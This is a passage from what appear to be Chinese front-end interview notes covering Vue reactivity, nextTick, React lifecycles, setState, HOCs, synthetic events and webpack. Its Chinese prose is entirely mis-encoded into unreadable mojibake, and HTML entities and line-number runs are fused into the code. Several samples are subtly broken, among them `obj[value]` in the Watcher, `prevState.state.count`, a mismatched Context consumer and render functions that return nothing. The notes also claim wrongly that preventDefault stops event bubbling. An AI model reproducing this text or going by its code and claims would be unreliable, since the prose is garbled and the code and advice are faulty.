addSub,å½“éœ€è¦æ´¾å‘æ›´æ–°çš„æ—¶å€™è°ƒç”¨ notify() ä¸‹é¢ç®€å•äº†è§£ Vue ç»„ä»¶æŒ‚è½½æ—¶æ·»åŠ å“åº”å¼çš„è¿‡ç¨‹ã€‚åœ¨ç»„ä»¶æŒ‚è½½æ—¶ï¼Œä¼šå…ˆå¯¹æ‰€æœ‰éœ€è¦çš„å±žæ€§è°ƒç”¨ Object.defineProperty(),ç„¶åŽå®žä¾‹åŒ– Watcherï¼Œä¼ å…¥ç»„ä»¶æ›´æ–°çš„å›žè°ƒï¼Œåœ¨å®žä¾‹åŒ–ä¸­ï¼Œä¼šå¯¹æ¨¡æ¿ä¸­çš„å±žæ€§è¿›è¡Œæ±‚å€¼ï¼Œè§¦å‘ä¾èµ–æ”¶é›†ã€‚ 1234567891011121314151617class Watcher &#123; constructor(obj, key, cb) &#123; // å°† Dep.target æŒ‡å‘è‡ªå·±ï¼Œç„¶åŽå‡ºå‘å±žæ€§çš„ getter æ·»åŠ ç›‘å¬ï¼Œæœ€åŽå°† Dep.target ç½®ç©º Dep.target = this; this.cb = cb; this.obj = obj; this.key = key; this.value = obj[value]; Dep.target = null; &#125; update() &#123; // èŽ·å¾—æ–°å€¼ this.value = this.obj[this.key]; // è°ƒç”¨ update æ–¹æ³•æ›´æ–° Dom this.cb(this.value); &#125;&#125; ä¸Šé¢æ˜¯ Wathcer çš„ç®€å•å®žçŽ°ï¼Œåœ¨æ‰§è¡Œæž„é€ å‡½æ•°çš„æ—¶å€™å°† Dep.target æŒ‡å‘è‡ªèº«ï¼Œä»Žè€Œä½¿å¾—æ”¶é›†åˆ°äº†å¯¹åº”çš„ Watcher,åœ¨æ´¾å‘æ›´æ–°çš„æ—¶å€™å–å‡ºå¯¹åº”çš„ Watcher ç„¶åŽæ‰§è¡Œ update å‡½æ•° æŽ¥ä¸‹æ¥ï¼Œéœ€è¦å¯¹ defineReactive å‡½æ•°è¿›è¡Œæ”¹é€ ï¼Œåœ¨è‡ªå®šä¹‰å‡½æ•°ä¸­æ·»åŠ ä¾èµ–æ”¶é›†å’Œæ´¾å‘æ›´æ–°ç›¸å…³çš„ä»£ç ï¼š 1234567891011121314151617181920212223242526function defineReactive(obj, key, val) &#123; // é€’å½’å­å±žæ€§ observe(val); let dp = new Dep(); Object.defineProperty(obj, key, &#123; // å¯æžšä¸¾ enumerable: true, // å¯é…ç½® configurable: true, // è‡ªå®šä¹‰å‡½æ•° get: function reactiveGetter() &#123; console.log('get val'); // å°†Watcher æ·»åŠ åˆ°è®¢é˜…ä¸­ if (Dep.target) &#123; dp.addSub(Dep.target) &#125; return val; &#125;, set: function reactiveSetter(newVal) &#123; console.log('change val'); val = newVal; // æ‰§è¡Œ watcher çš„ update æ–¹æ³• dp.notify(); &#125; &#125;)&#125; ä¸Šé¢çš„ä»£ç å®žçŽ°äº†ä¸€ä¸ªç®€æ˜“çš„æ•°æ®å“åº”å¼ï¼Œæ ¸å¿ƒæ€è·¯å°±æ˜¯æ‰‹åŠ¨è§¦å‘ä¸€æ¬¡å±žæ€§çš„ getter æ¥å®žçŽ°ä¾èµ–æ”¶é›†ã€‚ æµ‹è¯•ï¼š 123456789101112var data = &#123; name: 'lbh' &#125;observe(data)function update(value) &#123; document.querySelector('div').innerText = value&#125;// æ¨¡æ‹Ÿè§£æžåˆ° `&#123;&#123;name&#125;&#125;` è§¦å‘çš„æ“ä½œnew Watcher(data, 'name', update)// update Dom innerTextdata.name = 'haha' // get val// change val// get val Object.defineProperty çš„ç¼ºé™·å¦‚æžœé€šè¿‡ä¸‹æ ‡çš„æ–¹å¼ä¿®æ”¹æ•°æ®æˆ–è€…ç»™å¯¹è±¡æ–°å¢žå±žæ€§å¹¶ä¸ä¼šè§¦å‘ç»„ä»¶çš„é‡æ–°æ¸²æŸ“ï¼Œå› ä¸º Object.defineProperty ä¸èƒ½æ‹¦æˆªåˆ°è¿™äº›æ“ä½œï¼Œæ›´ç²¾ç¡®çš„æ¥è¯´ï¼Œå¯¹äºŽæ•°ç»„æ¥è¯´ï¼Œå¤§éƒ¨åˆ†æ“ä½œéƒ½æ˜¯æ‹¦æˆªä¸åˆ°çš„ï¼Œåªæ˜¯ vue å†…éƒ¨é€šè¿‡é‡å†™å‡½æ•°çš„æ–¹å¼æ”¹å†™äº†è¿™ä¸ªé—®é¢˜ã€‚ Vue æä¾›äº†ä¸€ä¸ª API è§£å†³ 1234567891011121314151617181920212223242526export function set (target: Array&lt;any&gt; | Object, key: any, val: any): any &#123; // åˆ¤æ–­æ˜¯å¦ä¸ºæ•°ç»„ä¸”ä¸‹æ ‡æ˜¯å¦æœ‰æ•ˆ if (Array.isArray(target) &amp;&amp; isValidArrayIndex(key)) &#123; // è°ƒç”¨ splice å‡½æ•°è§¦å‘æ´¾å‘æ›´æ–° // è¯¥å‡½æ•°å·²è¢«é‡å†™ target.length = Math.max(target.length, key) target.splice(key, 1, val) return val &#125; // åˆ¤æ–­ key æ˜¯å¦å·²ç»å­˜åœ¨ if (key in target &amp;&amp; !(key in Object.prototype)) &#123; target[key] = val return val &#125; const ob = (target: any).__ob__ // å¦‚æžœå¯¹è±¡ä¸æ˜¯å“åº”å¼å¯¹è±¡ï¼Œå°±èµ‹å€¼è¿”å›ž if (!ob) &#123; target[key] = val return val &#125; // è¿›è¡ŒåŒå‘ç»‘å®š defineReactive(ob.value, key, val) // æ‰‹åŠ¨æ´¾å‘æ›´æ–° ob.dep.notify() return val&#125; å¯¹äºŽæ•°ç»„è€Œè¨€ï¼ŒVue å†…éƒ¨é‡å†™äº†ä»¥ä¸‹å‡½æ•°å®žçŽ°æ´¾å‘æ›´æ–° 1234567891011121314151617181920212223242526272829303132333435363738// èŽ·å¾—æ•°ç»„åŽŸåž‹const arrayProto = Array.prototypeexport const arrayMethods = Object.create(arrayProto)// é‡å†™ä»¥ä¸‹å‡½æ•°const methodsToPatch = [ 'push', 'pop', 'shift', 'unshift', 'splice', 'sort', 'reverse']methodsToPatch.forEach(function (method) &#123; // ç¼“å­˜åŽŸç”Ÿå‡½æ•° const original = arrayProto[method] // é‡å†™å‡½æ•° def(arrayMethods, method, function mutator (...args) &#123; // å…ˆè°ƒç”¨åŽŸç”Ÿå‡½æ•°èŽ·å¾—ç»“æžœ const result = original.apply(this, args) const ob = this.__ob__ let inserted // è°ƒç”¨ä»¥ä¸‹å‡ ä¸ªå‡½æ•°æ—¶ï¼Œç›‘å¬æ–°æ•°æ® switch (method) &#123; case 'push': case 'unshift': inserted = args break case 'splice': inserted = args.slice(2) break &#125; if (inserted) ob.observeArray(inserted) // æ‰‹åŠ¨æ´¾å‘æ›´æ–° ob.dep.notify() return result &#125;)&#125;) ç¼–è¯‘è¿‡ç¨‹Vue ä¼šé€šè¿‡ç¼–è¯‘å™¨å°†æ¨¡æ¿é€šè¿‡å‡ ä¸ªé˜¶æ®µæœ€ç»ˆç¼–æˆä¸º render å‡½æ•°ï¼Œç„¶åŽé€šè¿‡æ‰§è¡Œ render å‡½æ•°ç”Ÿæˆ Virtual DOM æœ€ç»ˆæ˜ å°„ä¸ºçœŸå®ž DOM è¿™ä¸ªé˜¶æ®µåˆ†æˆä¸‰éƒ¨åˆ†ï¼š å°†æ¨¡æ¿è§£æžä¸º AST ä¼˜åŒ– AST å°† AST è½¬æ¢ä¸º render å‡½æ•° ç¬¬ä¸€ä¸ªé˜¶æ®µï¼Œé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼åŽ»åŒ¹é…æ¨¡æ¿ä¸­çš„å†…å®¹ï¼Œç„¶åŽå°†å†…å®¹æå–å‡ºæ¥åšå„ç§é€»è¾‘æ“ä½œï¼ŒæŽ¥ç€ä¼šç”Ÿæˆä¸€ä¸ªåŸºæœ¬çš„ AST å¯¹è±¡ 1234567891011121314&#123; // ç±»åž‹ typeï¼š1ï¼Œ // æ ‡ç­¾ tag, // å±žæ€§åˆ—è¡¨ attrsList:attrs, // å±žæ€§æ˜ å°„ attrsMap:makeAttrsMapï¼ˆattrsï¼‰, // çˆ¶èŠ‚ç‚¹ parent, // å­èŠ‚ç‚¹ children:[]&#125; ç„¶åŽä¼šæ ¹æ®è¿™ä¸ªæœ€åŸºæœ¬çš„ ASTå¯¹è±¡çš„å±žæ€§ï¼Œè¿›ä¸€æ­¥æ‰©å±• AST å½“ç„¶åœ¨è¿™ä¸€é˜¶æ®µä¸­ï¼Œè¿˜ä¼šè¿›è¡Œå…¶ä»–çš„ä¸€äº›åˆ¤æ–­é€»è¾‘ã€‚æ¯”å¦‚è¯´å¯¹æ¯”å‰åŽå¼€é—­æ ‡ç­¾æ˜¯å¦ä¸€è‡´ï¼Œåˆ¤æ–­æ ¹ç»„ä»¶æ˜¯å¦åªå­˜åœ¨ä¸€ä¸ªï¼Œåˆ¤æ–­æ˜¯å¦ç¬¦åˆ HTML5 Content Model è§„èŒƒç­‰ç­‰é—®é¢˜ã€‚ ä¼˜åŒ– AST é˜¶æ®µï¼Œå¯¹èŠ‚ç‚¹è¿›è¡Œäº†é™æ€å†…å®¹æå–ï¼Œå°†æ°¸è¿œä¸ä¼šå˜åŠ¨çš„èŠ‚ç‚¹æ‹¿å‡ºæ¥ï¼Œå®žçŽ°å¤ç”¨ Virtual DOM,è·³è¿‡å¯¹æ¯”ç®—æ³•çš„åŠŸèƒ½ã€‚ æœ€åŽä¸€ä¸ªé˜¶æ®µï¼Œé€šè¿‡ AST ç”Ÿæˆ render å‡½æ•°ï¼Œä¸»è¦çš„ç›®çš„æ˜¯éåŽ†æ•´ä¸ª AST,æ ¹æ®ä¸åŒçš„æ¡ä»¶ç”Ÿæˆä¸åŒçš„ä»£ç  NextTick åŽŸç†æµ…æžnextTick å¯ä»¥è®©æˆ‘ä»¬åœ¨ä¸‹æ¬¡ DOM æ›´æ–°å¾ªçŽ¯ç»“æŸä¹‹åŽæ‰§è¡Œå»¶è¿Ÿå›žè°ƒï¼Œç”¨äºŽèŽ·å¾—æ›´æ–°åŽçš„ DOM é»˜è®¤ä½¿ç”¨ microtasksï¼Œä½†æ˜¯ç‰¹æ®Šæƒ…å†µä¸‹ä¼šä½¿ç”¨ macrotasksï¼Œæ¯”å¦‚ v-on å¯¹äºŽå®žçŽ° macrotasksï¼Œä¼šå…ˆåˆ¤æ–­æ˜¯å¦èƒ½ä½¿ç”¨ setImmediateï¼Œä¸èƒ½çš„è¯å°±é™çº§ä¸º MessageChannelï¼Œä»¥ä¸Šéƒ½ä¸è¡Œçš„è¯å°±ä½¿ç”¨ setTimeout 12345678910111213141516if (typeof setImmediate !== 'undefined' &amp;&amp; isNative(setImmediate)) &#123; macroTimerFunc = () =&gt; &#123; setImmediate(flushCallbacks) &#125;&#125; else if (typeof MessageChannel !== 'undefined' &amp;&amp; (isNative(MessageChannel) || MessageChannel.toString() === '[object MessageChannelConstructor]')) &#123; const channel = new MessageChannel(); const port = channel.port2; channel.port1.onmessage = flushCallbacks; macroTimerFunc = () =&gt; &#123; port.postMessage(1) &#125;&#125; else &#123; macroTimerFunc = () =&gt; &#123; setTimeout(flushCallbacks, 0) &#125;&#125; React å¸¸è€ƒçš„åŸºæœ¬çŸ¥è¯†ç‚¹å£°æ˜Žå‘¨æœŸv16 ç‰ˆæœ¬ä¸­å¼•å…¥äº† Fiber æœºåˆ¶ï¼Œè¿™ä¸ªæœºåˆ¶ä¸€å®šç¨‹åº¦ä¸Šå½±å“äº†éƒ¨åˆ†ç”Ÿå‘½å‘¨æœŸå‡½æ•°çš„è°ƒç”¨ï¼Œä¹Ÿå¼•å…¥äº†æ–°çš„ä¸¤ä¸ª API æ¥è§£å†³é—®é¢˜ã€‚å…³äºŽ Fiber ä¹‹å‰ç‰ˆæœ¬çš„ reactå¦‚æžœåµŒå¥—å¤ªå¤šå±‚ï¼Œä¼šå¯¼è‡´è°ƒç”¨æ ˆè¿‡é•¿ï¼Œå†åŠ ä¸Šå¤æ‚çš„æ“ä½œï¼Œå°±å¯èƒ½å¯¼è‡´é•¿æ—¶é—´é˜»å¡žä¸»çº¿ç¨‹ï¼Œå¸¦æ¥ä¸å¥½çš„ç”¨æˆ·ä½“éªŒã€‚å°±ç±»ä¼¼æ½œæ°´å‘˜ï¼Œåªæœ‰æ½œåˆ°åº•æ‰ä¼šå›žåˆ°æ°´é¢ã€‚è€Œå¦‚æžœæ°´é¢è¿™æ—¶å€™å‘ç”Ÿäº†å…¶ä»–ä¼˜å…ˆçº§æ›´é«˜çš„äº‹æƒ…ï¼Œä¹Ÿè¦ç­‰æ½œæ°´å‘˜æ½œåˆ°åº•åŽå†é‡æ–°ä¸Šæ¥ã€‚ Fiber å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜è€Œç”Ÿçš„ï¼Œå®ƒæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„å †æ ˆå¸§ï¼Œæ–°çš„è°ƒåº¦å™¨hiæ ¹æ®ä¼˜å…ˆçº§è‡ªç”±è°ƒç”¨è¿™äº›å¸§ï¼Œä»Žè€Œå°†ä¹‹å‰çš„åŒæ­¥æ¸²æŸ“å˜æˆäº†å¼‚æ­¥æ¸²æŸ“ï¼Œåœ¨ä¸å½±å“ä½“éªŒçš„æƒ…å†µä¸‹åŽ»åˆ†æ®µè®¡ç®—æ›´æ–°ã€‚ ä¼˜å…ˆçº§çš„åŒºåˆ«ï¼Œå¯¹äºŽåŠ¨ç”»è¿™ç§ä¼˜å…ˆæ€§åˆ«å¾ˆé«˜çš„ä¸œè¥¿ï¼Œ16ms å¿…é¡»æ¸²æŸ“ä¸€æ¬¡ä¿è¯ä¸å¡é¡¿çš„æƒ…å†µä¸‹ï¼Œreact ä¼šæ¯ 16ms ä»¥å†…æš‚åœä¸€æ¬¡æ›´æ–°ï¼Œè¿”å›žæ¥ç»§ç»­æ¸²æŸ“åŠ¨ç”»ã€‚æ½œæ°´å‘˜ä¸å†ä¸€ç›´æ½œåˆ°åº•ï¼Œè€Œæ˜¯æ½œåˆ°ä¸€å®šæ·±åº¦åŽåœ¨è¯¥ç‚¹è®¾ç½®ä¸€ä¸ªä¼ é€ç‚¹åŽæµ®å‡ºæ°´é¢ï¼Œç„¶åŽä¼ å›žåŽ»ä¼ é€ç‚¹ç»§ç»­ä¸‹æ½œã€‚ å¯¹äºŽå¼‚æ­¥æ¸²æŸ“ï¼Œæœ‰ä¸‰ä¸ªé˜¶æ®µï¼šreconcliiation å’Œ commit ï¼Œå‰è€…è¿‡ç¨‹æ˜¯å¯ä»¥æ‰“æ–­çš„ï¼ŒåŽè€…ä¸èƒ½æš‚åœï¼Œä¼šä¸€ç›´æ›´æ–°ç•Œé¢ç›´åˆ°å®Œæˆã€‚ Reconciliation é˜¶æ®µ componentWillMount componentWillReceiveProps shouldComponentUpdate componentWillUpdate Commit é˜¶æ®µ componentDidMount componentDidUpdate componentWillUnmount å› ä¸ºå‰è€…æ˜¯å¯ä»¥è¢«æ‰“æ–­çš„ï¼Œæ‰€ä»¥ Reconciliation é˜¶æ®µä¼šæ‰§è¡Œçš„å£°æ˜Žå‘¨æœŸå‡½æ•°å°±å¯èƒ½ä¼šå‡ºçŽ°è°ƒç”¨å¤šæ¬¡çš„æƒ…å†µï¼Œä»Žè€Œå¼•èµ· bugã€‚å› æ­¤å¯¹äºŽ Reconciliation é˜¶æ®µè°ƒç”¨çš„å‡ ä¸ªå‡½æ•°ï¼Œé™¤äº† shouldComponentUpdate ä¹‹å¤–ï¼Œå…¶ä»–éƒ½åº”è¯¥é¿å…åŽ»ä½¿ç”¨ï¼Œå¹¶ä¸” V16 ä¸­ä¹Ÿå¼•å…¥äº†æ–°çš„ API æ¥è§£å†³è¿™ä¸ªé—®é¢˜ getDerivedStateFromProps ç”¨äºŽæ›¿æ¢ componentWillRecivePropsï¼Œè¿™ä¸ªå‡½æ•°ä¼šåœ¨åˆå§‹åŒ–å’Œ update æ—¶å€™è¢«è°ƒç”¨ã€‚ 1234567891011121314151617class ExampleComponent extends React.Component &#123; // Initialize state in constructor, // Or with a property initializer. state = &#123;&#125;; static getDerivedStateFromProps(nextProps, prevState) &#123; if (prevState.someMirroredValue !== nextProps.someValue) &#123; return &#123; derivedData: computeDerivedState(nextProps), someMirroredValue: nextProps.someValue &#125;; &#125; // Return null to indicate no change to state. return null; &#125;&#125; getSnapshotBeforeUpdate ç”¨äºŽæ›¿æ¢ componentWillUpdate ï¼Œè¯¥å‡½æ•°ä¼šåœ¨ update åŽ DOM æ›´æ–°å‰è¢«è°ƒç”¨ï¼Œç”¨äºŽè¯»å–æœ€æ–°çš„ DOM æ•°æ®ã€‚ setStatesetState æ˜¯å¼‚æ­¥çš„ï¼Œè°ƒç”¨è¿™ä¸ªå‡½æ•°ä¸ä¼šé©¬ä¸Šå¼•èµ· state çš„å˜åŒ– 1234567handle()&#123; console.log(this.state.count); // 0 this.setState(&#123;count:this.state.count+1&#125;); this.setState(&#123;count:this.state.count+1&#125;); this.setState(&#123;count:this.state.count+1&#125;); console.log(this.state.count) // 0&#125; ä¸Šé¢çš„ä»£ç ç­‰åŒäºŽä¸‹é¢ 123456Object.assign( &#123;&#125;, &#123;count:this.state.count+1&#125;, &#123;count:this.state.count+1&#125;, &#123;count:this.state.count+1&#125;) å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼æ¥å®žçŽ°æˆ‘ä»¬åŽŸæ¥çš„ç›®çš„ 12345handle()&#123; this.setState((prevState)=&gt;(&#123;count:prevState.state.count+1&#125;)); this.setState((prevState)=&gt;(&#123;count:prevState.state.count+1&#125;)); this.setState((prevState)=&gt;(&#123;count:prevState.state.count+1&#125;));&#125; åœ¨æ¯æ¬¡ setState åŽå–å¾—æ­£ç¡®çš„ stateï¼Œå¯ä»¥è¿™æ ·å®žçŽ°ï¼š 12345handle()&#123; this.setState((prevState)=&gt;(&#123;count:prevState.count+1&#125;),()=&gt;&#123; console.log(this.state); &#125;)&#125; æ€§èƒ½ä¼˜åŒ–åœ¨ shouldComponentUpdate å‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿”å›žå¸ƒå°”å€¼æ¥å†³å®šå½“å‰ç»„ä»¶æ˜¯å¦éœ€è¦æ›´æ–°ã€‚ é€šè¿‡ immutable æˆ–è€… immer è¿™äº›åº“æ¥ç”Ÿæˆä¸å¯å˜å¯¹è±¡ã€‚è¿™ç±»åº“å¯¹äºŽæ“ä½œå¤§è§„æ¨¡çš„æ•°æ®æ¥è¯´ä¼šæå‡ä¸é”™çš„æ€§èƒ½ï¼Œå¹¶ä¸”ä¸€æ—¦æ”¹å˜æ•°æ®å°±ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œå¯¹æ¯”å‰åŽ state æ˜¯å¦ä¸€è‡´ä¹Ÿå°±æ–¹ä¾¿å¤šäº†ã€‚ å•çº¯çš„æµ…æ¯”è¾ƒä¸€ä¸‹ï¼Œå¯ä»¥ç›´æŽ¥ä½¿ç”¨ PureComponentï¼Œåº•å±‚å°±æ˜¯å®žçŽ°äº†æµ…æ¯”è¾ƒ stateã€‚ 123456789class Test extends React.PureComponent &#123; render() &#123; return ( &lt;div&gt; PureComponent &lt;/div&gt; ) &#125;&#125; V16 ä¹‹åŽå¯ä»¥ä½¿ç”¨ React.memo æ¥å®žçŽ°ç›¸åŒçš„åŠŸèƒ½ 12345const Test = React.memo(()=&gt;&#123; &lt;div&gt; PureComponent &lt;/div&gt; &#125;) é€šè¿‡è¿™ç§æ–¹å¼æˆ‘ä»¬å°±å¯ä»¥æ—¢å®žçŽ°äº† shouldComponentUpdate çš„æµ…æ¯”è¾ƒï¼Œåˆèƒ½å¤Ÿä½¿ç”¨å‡½æ•°ç»„ä»¶ã€‚ ç»„ä»¶é€šä¿¡åŒæ ·çš„æƒ…å†µï¼š çˆ¶å­ç»„ä»¶ å…„å¼Ÿç»„ä»¶ è·¨å¤šå±‚æ¬¡ç»„ä»¶ ä»»æ„ç»„ä»¶ çˆ¶å­ç»„ä»¶çˆ¶ç»„ä»¶é€šè¿‡ props ä¼ é€’æ•°æ®ç»™å­ç»„ä»¶ï¼Œå­ç»„ä»¶é€šè¿‡è°ƒç”¨çˆ¶ç»„ä»¶ä¼ æ¥å‡½æ•°ä¼ é€’ç»™çˆ¶ç»„ä»¶ï¼Œè¿™ä¸¤ç§æ–¹å¼æ˜¯æœ€å¸¸ç”¨çš„çˆ¶å­é€šä¿¡çš„æ–¹æ³•ã€‚ è¿™ç§çˆ¶å­é€šä¿¡æ–¹å¼ä¹Ÿå°±æ˜¯å…¸åž‹çš„å•å‘æ•°æ®æµï¼Œçˆ¶ç»„ä»¶é€šè¿‡ props ä¼ é€’æ•°æ®ï¼Œå­ç»„ä»¶ä¸èƒ½ç›´æŽ¥ä¿®æ”¹ props,è€Œæ˜¯å¿…é¡»é€šè¿‡è°ƒç”¨çˆ¶ç»„ä»¶å‡½æ•°çš„æ–¹å¼æ¥å‘ŠçŸ¥çˆ¶ç»„ä»¶ä¿®æ”¹æ•°æ® å…„å¼Ÿç»„ä»¶ä¸Žè¿™ç§æƒ…å†µå¯ä»¥é€šè¿‡å…±åŒçš„çˆ¶ç»„ä»¶æ¥ç®¡ç†çŠ¶æ€å’Œäº‹ä»¶å‡½æ•°ã€‚æ¯”å¦‚å…¶ä¸­ç»™ä¸€ä¸ªå…„å¼Ÿç»„ä»¶è°ƒç”¨çˆ¶ç»„ä»¶ä¼ é€’è¿‡æ¥çš„äº‹ä»¶å‡½æ•°ä¿®æ”¹çˆ¶ç»„ä»¶ä¸­çš„çŠ¶æ€ï¼Œç„¶åŽçˆ¶ç»„ä»¶å°†çŠ¶æ€ä¼ é€’ç»™å¦ä¸€ä¸ªå…„å¼Ÿç»„ä»¶ è·¨å¤šå±‚æ¬¡ç»„ä»¶ä½¿ç”¨ Context API 123456789101112131415161718192021222324// åˆ›å»º Contextï¼Œå¯ä»¥åœ¨å¼€å§‹å°±ä¼ å…¥å€¼const StateContext = React.createContext();class Parent extends React.Component&#123; render()&#123; // value å°±æ˜¯ä¼ å…¥ Context ä¸­çš„å€¼ &lt;StateContext.Provider value='haha'&gt; &lt;Child/&gt; &lt;/StateContext.Provider&gt; &#125;&#125;class Child extends React.Component&#123; render()&#123; return( &lt;ThemeContext.Consumer&gt; // å–å‡ºå€¼ &#123;context=&gt;&#123; name is &#123;context&#125; &#125;&#125; &lt;/ThemeContext.Consumer&gt; ) &#125; &#125; ä»»æ„ç»„ä»¶è¿™ç§æ–¹å¼å¯ä»¥é€šè¿‡ Reduxã€Mobx ç­‰å·¥å…· æˆ–è€… Event Bus è§£å†³ã€‚ HOC æ˜¯ä»€ä¹ˆï¼Ÿç›¸æ¯” mixins æœ‰ä»€ä¹ˆä¼˜ç‚¹ä¾‹å­ 123function add(a,b)&#123; return a + b&#125; ç»™è¿™ä¸ª add å‡½æ•°æ·»åŠ ä¸€ä¸ªè¾“å‡ºç»“æžœçš„åŠŸèƒ½ï¼Œå®žçŽ°ä¼˜é›…å¹¶ä¸”å¯ä»¥å¤ç”¨å’Œæ‰©å±•ï¼š 12345678910function withLog(fn)&#123; function wrapper(a,b)&#123; const result = fn(a,b); console.log(result); return result; &#125; return wrapper;&#125;const withLogAdd = withLog(add);withLogAdd(); è¿™ç§åšæ³•åœ¨å‡½æ•°å¼ç¼–ç¨‹é‡Œé¢è¢«ç§°ä¸ºé«˜é˜¶å‡½æ•°ã€‚é«˜é˜¶ç»„ä»¶å’Œé«˜é˜¶å‡½æ•°å°±æ˜¯åŒä¸€ä¸ªä¸œè¥¿ï¼Œå®žçŽ°ä¸€ä¸ªå‡½æ•°ï¼Œä¼ å…¥ä¸€ä¸ªç»„ä»¶ï¼Œç„¶åŽåœ¨å‡½æ•°å†…éƒ¨å†å®žçŽ°ä¸€ä¸ªå‡½æ•°åˆ‡æ‰©å±•ä¼ å…¥çš„ç»„ä»¶ï¼Œæœ€åŽè¿”å›žä¸€ä¸ªæ–°çš„ç»„ä»¶ï¼Œè¿™å°±æ˜¯é«˜é˜¶ç»„ä»¶çš„æ¦‚å¿µï¼Œä½œç”¨æ˜¯ä¸ºäº†æ›´å¥½çš„å¤ç”¨ä»£ç ã€‚ HOC å’Œ Vue ä¸­çš„ mixins ä½œç”¨æ˜¯ä¸€è‡´çš„ï¼Œå¹¶ä¸”åœ¨æ—©æœŸçš„ React ä¹Ÿæ˜¯ä½¿ç”¨ mixins çš„æ–¹å¼ã€‚ä½†æ˜¯åœ¨ä½¿ç”¨ class çš„æ–¹å¼åˆ›å»ºç»„ä»¶ä»¥åŽï¼Œmixins çš„æ–¹å¼å°±ä¸èƒ½ä½¿ç”¨äº†ï¼Œå¹¶ä¸”å…¶å®ž mixins ä¹Ÿæ˜¯å­˜åœ¨ä¸€äº›é—®é¢˜çš„ï¼Œæ¯”å¦‚ï¼š éšå«äº†ä¸€äº›ä¾èµ–ï¼Œå¤šäººå¼€å‘ï¼Œæˆ‘å†™äº†æŸä¸ªstate å¹¶ä¸”åœ¨ mixins ä¸­ä½¿ç”¨äº†ï¼Œè¿™å°±å­˜åœ¨ä¸€ä¸ªä¾èµ–å…³ç³»ã€‚å…¶ä»–äººè¦ç§»é™¤å°±è¦åŽ» mixins é‡Œé¢æŸ¥æ‰¾ä¾èµ– å¤šä¸ª mixin ä¸­å¯èƒ½å­˜åœ¨åŒåçš„å‡½æ•°ï¼Œä¼šé€ æˆå‡½æ•°é‡å†™ é›ªçƒæ•ˆåº”ï¼Œä¸€ä¸ªmixin è¢«å¤šä¸ªç»„ä»¶ä½¿ç”¨ï¼Œä¼šç”±äºŽéœ€æ±‚ä½¿å¾— mixin å˜å¾—è‡ƒè‚¿ã€‚ HOC è§£å†³äº†è¿™äº›é—®é¢˜ï¼Œå¹¶ä¸”å®ƒä»¬è¾¾æˆçš„æ•ˆæžœä¹Ÿæ˜¯ä¸€è‡´çš„ï¼ŒåŒæ—¶ä¹Ÿæ›´åŠ å‡½æ•°å¼äº†ã€‚ äº‹ä»¶æœºåˆ¶12345const Test = (&#123;list,handleClick&#125;)=&gt;&#123; list.map((item,index)=&gt;( &lt;span onClick=&#123;handleClick&#125; key=&#123;index&#125;&gt;&#123;index&#125;&lt;/span&gt; ))&#125; JSX ä¸Šå†™çš„äº‹ä»¶å¹¶æ²¡æœ‰ç»‘å®šåœ¨å¯¹åº”çœŸå®žçš„ DOM ä¸Šï¼Œè€Œæ˜¯é€šè¿‡äº‹ä»¶ä»£ç†çš„æ–¹å¼ï¼Œå°†æ‰€æœ‰çš„äº‹ä»¶éƒ½ç»Ÿä¸€ç»‘å®šåœ¨ documentä¸Šï¼Œè¿™æ ·çš„æ–¹å¼ä¸ä»…å¯ä»¥å‡å°‘å†…å­˜çš„æŸè€—ï¼Œè¿˜èƒ½åœ¨ç»„ä»¶æŒ‚è½½æ—¶ç»Ÿä¸€è®¢é˜…å’Œç§»é™¤äº‹ä»¶ã€‚ å¦å¤–å†’æ³¡åˆ° document ä¸Šçš„äº‹ä»¶ä¹Ÿä¸æ˜¯åŽŸç”Ÿçš„æµè§ˆå™¨äº‹ä»¶ï¼Œè€Œæ˜¯ Reactè‡ªå·±å®žçŽ°çš„åˆæˆäº‹ä»¶ï¼ˆSyntheticEvnetï¼‰ã€‚å› æ­¤æˆ‘ä»¬ä¸æƒ³è¦äº‹ä»¶å†’æ³¡çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨ event.preventDefault åˆæˆäº‹ä»¶çš„ç›®çš„ï¼š æŠ¹å¹³äº†æµè§ˆå™¨ä¹‹é—´çš„å…¼å®¹é—®é¢˜ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯è·¨æµè§ˆå™¨åŽŸç”Ÿäº‹ä»¶åŒ…è£…å™¨ï¼Œèµ‹äºˆäº†è·¨æµè§ˆå™¨å¼€å‘çš„èƒ½åŠ› å¯¹äºŽåŽŸç”Ÿæµè§ˆå™¨æ¥è¯´ï¼Œæµè§ˆå™¨ä¼šç»™ç›‘å¬å™¨åˆ›å»ºä¸€ä¸ªäº‹ä»¶å¯¹è±¡ï¼Œå¦‚æžœæœ‰å¾ˆå¤šäº‹ä»¶ç›‘å¬å°±è¦åˆ†é…å¾ˆå¤šäº‹ä»¶å¯¹è±¡ä¼šé€ æˆé«˜é¢çš„å†…å­˜åˆ†é…é—®é¢˜ã€‚ä½†æ˜¯å¯¹äºŽåˆæˆäº‹ä»¶æ¥è¯´ï¼Œæœ‰ä¸€ä¸ªäº‹ä»¶æ± ä¸“é—¨æ¥ç®¡ç†å®ƒä»¬çš„åˆ›å»ºå’Œé”€æ¯ï¼Œå½“äº‹ä»¶éœ€è¦è¢«ä½¿ç”¨çš„æ—¶å€™ï¼Œå°±ä¼šä»Žæ± å­ä¸­å¤ç”¨å¯¹è±¡ï¼Œäº‹ä»¶å›žè°ƒç»“æŸåŽï¼Œå°±ä¼šé”€æ¯äº‹ä»¶å¯¹è±¡ä¸Šçš„å±žæ€§ï¼Œä»Žè€Œä¾¿äºŽä¸‹ä¸€æ¬¡å¤ç”¨äº‹ä»¶å¯¹è±¡ã€‚ Webpackæ€§èƒ½ä¼˜åŒ–å‡å°‘webpack æ‰“åŒ…æ—¶é—´ä¼˜åŒ– loaderå½±å“æ‰“åŒ…æ•ˆçŽ‡ç¬¬ä¸€ä¸ªå¿…å®šæ˜¯ babelï¼Œå› ä¸º babel hiå°†ä»£ç è½¬ä¸ºå­—ç¬¦ä¸²ç”Ÿæˆ ASTï¼Œç„¶åŽå¯¹ AST ç»§ç»­è¿›è¡Œè½¬å˜æœ€åŽå†ç”Ÿæˆæ–°çš„ä»£ç 